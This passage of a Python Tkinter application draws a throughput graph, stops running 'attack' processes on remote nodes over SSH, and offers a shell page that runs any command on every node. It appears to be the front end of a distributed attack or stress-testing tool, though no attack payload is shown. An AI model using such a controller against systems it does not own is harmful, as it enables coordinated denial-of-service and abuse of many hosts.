        h = self.graph_canvas.winfo_height()
        if w < 10 or h < 10 or not self.throughput_history:
            return
        data = list(self.throughput_history)
        mx = max(data) if data else 1
        if mx == 0:
            mx = 1
        n = len(data)
        bw = max(w / max(n, 1), 2)
        for i, val in enumerate(data):
            x0 = i * bw
            bh = (val / mx) * (h - 4)
            y0 = h - bh
            c = GREEN_C if val > mx * 0.6 else YELLOW_C if val > mx * 0.3 else RED_C
            self.graph_canvas.create_rectangle(x0, y0, x0 + bw - 1, h, fill=c, outline="")
        self.graph_canvas.create_text(w - 5, 5, text=f"{mx:.1f}", anchor="ne", fill=FG_DIM,
                                      font=("Consolas", 8))

    def _stop(self):
        self.attack_running = False
        nodes = load_nodes()
        node_map = {n.get("name", n["ip"]): n for n in nodes}
        with self.lock:
            for (nn, si), pid in self.all_pids.items():
                nd = node_map.get(nn)
                if nd:
                    threading.Thread(target=ssh_cmd, args=(nd, f"kill -INT {pid}", 5), daemon=True).start()
        self.status_label.config(text="STOPPED", fg=YELLOW_C)
        self.back_btn.config(state="normal", command=self._reset_and_back)

    def _reset_and_back(self):
        self.dash_frame.pack_forget()
        self.config_frame.pack(fill="both", expand=True)
        self.back_btn.config(state="normal", command=lambda: self.app.show("MainPage"))
        self.attack_running = False
        self.app.show("MainPage")


class ShellPage(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=BG)
        self.app = app

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=20, pady=(20, 10))
        ttk.Button(top, text="← Back", style="Back.TButton",
                   command=lambda: app.show("MainPage")).pack(side="left")
        tk.Label(top, text="SHELL", bg=BG, fg=WHITE_C,
                 font=("Consolas", 16, "bold")).pack(side="left", padx=15)

        input_frame = tk.Frame(self, bg=BG)
        input_frame.pack(fill="x", padx=20, pady=5)

        self.cmd_var = tk.StringVar()
        e = tk.Entry(input_frame, textvariable=self.cmd_var, bg=BG2, fg=WHITE_C,
                     insertbackground=WHITE_C, font=("Consolas", 11), relief="flat", bd=3)
        e.pack(side="left", fill="x", expand=True, ipady=4)
        e.bind("<Return>", lambda ev: self._run())

        ttk.Button(input_frame, text="Run", style="Action.TButton",
                   command=self._run).pack(side="left", padx=(10, 0))

        self.output = tk.Text(self, bg=BG2, fg=FG, font=("Consolas", 10), height=20,
                              relief="flat", bd=0, padx=10, pady=10, state="disabled")
        self.output.pack(fill="both", expand=True, padx=20, pady=10)

    def _run(self):
        cmd = self.cmd_var.get().strip()
        if not cmd:
            return

        self.output.config(state="normal")
        self.output.delete("1.0", "end")
        self.output.insert("end", f"$ {cmd}\n\n")
        self.output.config(state="disabled")

        def _do():
            nodes = load_nodes()
            results = {}

            def _exec(node):
                out, err, rc = ssh_cmd(node, cmd, timeout=120)
                results[node.get("name", node["ip"])] = (out, err, rc)

            threads = [threading.Thread(target=_exec, args=(n,)) for n in nodes]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=130)

            self.after(0, lambda: self._render(results))

        threading.Thread(target=_do, daemon=True).start()

    def _render(self, results):
        self.output.config(state="normal")
        for name, (out, err, rc) in results.items():
            icon = "●" if rc == 0 else "✕"
            self.output.insert("end", f"{icon} {name}\n")
            if out:
                for line in out.split("\n")[:15]:
                    self.output.insert("end", f"  {line}\n")
            if err and rc != 0:
                self.output.insert("end", f"  ERROR: {err[:120]}\n")
            self.output.insert("end", "\n")
        self.output.see("end")
        self.output.config(state="disabled")


# ─── Entry ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    app = App()
    app.mainloop()
